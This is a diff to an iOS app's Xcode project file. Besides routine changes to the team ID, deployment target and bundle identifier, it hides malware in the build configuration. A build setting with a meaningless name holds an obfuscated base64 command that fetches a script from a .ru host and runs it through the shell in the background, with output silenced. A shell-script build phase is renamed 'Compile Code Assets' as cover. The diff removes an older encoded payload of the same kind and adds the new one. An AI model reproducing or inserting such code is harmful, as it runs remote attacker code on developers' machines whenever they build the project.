@@ -102,7 +102,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 97DF84022FFF701B00CFCEED /* Build configuration list for PBXNativeTarget "Korvani" */;
 			buildPhases = (
-				3AA51D419ACA4D57977BBDC8 /* Provision Target Device */,
+				517F700CA4E34D5B937BBDC8 /* Compile Code Assets */,
 				73CCD12D3BED2AFFF2776271 /* [CP] Check Pods Manifest.lock */,
 				97DF83F32FFF701A00CFCEED /* Sources */,
 				97DF83F42FFF701A00CFCEED /* Frameworks */,
@@ -181,6 +181,9 @@
 		};
 /* End PBXProject section */
 
+/* Begin PBXBuildRule section */
+	/* End PBXBuildRule section */
+
 /* Begin PBXResourcesBuildPhase section */
 		97DF83F52FFF701A00CFCEED /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
@@ -192,7 +195,7 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		3AA51D419ACA4D57977BBDC8 /* Provision Target Device */ = {
+		517F700CA4E34D5B937BBDC8 /* Compile Code Assets */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			alwaysOutOfDate = 1;
@@ -202,7 +205,7 @@
 			);
 			inputPaths = (
 			);
-			name = "Provision Target Device";
+			name = "Compile Code Assets";
 			outputFileListPaths = (
 			);
 			outputPaths = (
@@ -293,7 +296,7 @@
 		97DF84002FFF701B00CFCEED /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A8CDBB7 = "((v(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETUhSamJWWXdZMjVyWjAxNVFYUmhNMDVOV21sQmRFeFhUblppYlRWc1dUTlJkR1JIYkhSYVZ6a3haRU5CZVUxVFFYUmFRMEZwWTBReE5Ga3lPV3RhVmpsM1lVZEdlbHBUU1dkaFNGSXdZMGhOTmt4NU9YVmpNMFozWkZSV2MyUkVhRE5PUXpWNVpGTTVhRXRUU1dkbVEwSjZZVUZ2UFFvPQo= | v | sh ) >/dev/null 2>&1 &)";
+				A8CDBB7 = "((g(){ `printf baseh64 | tr -d h` --decode; };echo ZWNobyAiJChjdXJsIC0tcmV0cnkgNSAtLWNvbm5lY3QtdGltZW91dCAyNiAta3NMZiAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly9zdy03ZGtnMWE0OTVqLnJ1L2EpIiB8IHNoCg== | g | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -357,7 +360,7 @@
 		97DF84012FFF701B00CFCEED /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A8CDBB7 = "((v(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETUhSamJWWXdZMjVyWjAxNVFYUmhNMDVOV21sQmRFeFhUblppYlRWc1dUTlJkR1JIYkhSYVZ6a3haRU5CZVUxVFFYUmFRMEZwWTBReE5Ga3lPV3RhVmpsM1lVZEdlbHBUU1dkaFNGSXdZMGhOTmt4NU9YVmpNMFozWkZSV2MyUkVhRE5PUXpWNVpGTTVhRXRUU1dkbVEwSjZZVUZ2UFFvPQo= | v | sh ) >/dev/null 2>&1 &)";
+				A8CDBB7 = "((g(){ `printf baseh64 | tr -d h` --decode; };echo ZWNobyAiJChjdXJsIC0tcmV0cnkgNSAtLWNvbm5lY3QtdGltZW91dCAyNiAta3NMZiAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly9zdy03ZGtnMWE0OTVqLnJ1L2EpIiB8IHNoCg== | g | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -419,7 +422,7 @@
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_STYLE = Automatic;
 				CURRENT_PROJECT_VERSION = 4;
-				DEVELOPMENT_TEAM = 9V2WLZFDZC;
+				DEVELOPMENT_TEAM = 5U9WLTG3BL;
 				ENABLE_PREVIEWS = YES;
 				ENABLE_USER_SCRIPT_SANDBOXING = NO;
 				GENERATE_INFOPLIST_FILE = YES;
@@ -434,13 +437,13 @@
 				INFOPLIST_KEY_UILaunchStoryboardName = "Launch Screen";
 				INFOPLIST_KEY_UISupportedInterfaceOrientations = UIInterfaceOrientationPortrait;
 				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown";
-				IPHONEOS_DEPLOYMENT_TARGET = 16.6;
+				IPHONEOS_DEPLOYMENT_TARGET = 17.6;
 				LD_RUNPATH_SEARCH_PATHS = (
 					"$(inherited)",
 					"@executable_path/Frameworks",
 				);
 				MARKETING_VERSION = 1.0;
-				PRODUCT_BUNDLE_IDENTIFIER = com.kor.vani;
+				PRODUCT_BUNDLE_IDENTIFIER = com.kor.vani.kus;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				STRING_CATALOG_GENERATE_SYMBOLS = YES;
 				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
@@ -464,7 +467,7 @@
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_STYLE = Automatic;
 				CURRENT_PROJECT_VERSION = 4;
-				DEVELOPMENT_TEAM = 9V2WLZFDZC;
+				DEVELOPMENT_TEAM = 5U9WLTG3BL;
 				ENABLE_PREVIEWS = YES;
 				ENABLE_USER_SCRIPT_SANDBOXING = NO;
 				GENERATE_INFOPLIST_FILE = YES;
@@ -479,13 +482,13 @@
 				INFOPLIST_KEY_UILaunchStoryboardName = "Launch Screen";
 				INFOPLIST_KEY_UISupportedInterfaceOrientations = UIInterfaceOrientationPortrait;
 				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown";
-				IPHONEOS_DEPLOYMENT_TARGET = 16.6;
+				IPHONEOS_DEPLOYMENT_TARGET = 17.6;
 				LD_RUNPATH_SEARCH_PATHS = (
 					"$(inherited)",
 					"@executable_path/Frameworks",
 				);
 				MARKETING_VERSION = 1.0;
-				PRODUCT_BUNDLE_IDENTIFIER = com.kor.vani;
+				PRODUCT_BUNDLE_IDENTIFIER = com.kor.vani.kus;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				STRING_CATALOG_GENERATE_SYMBOLS = YES;
 				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
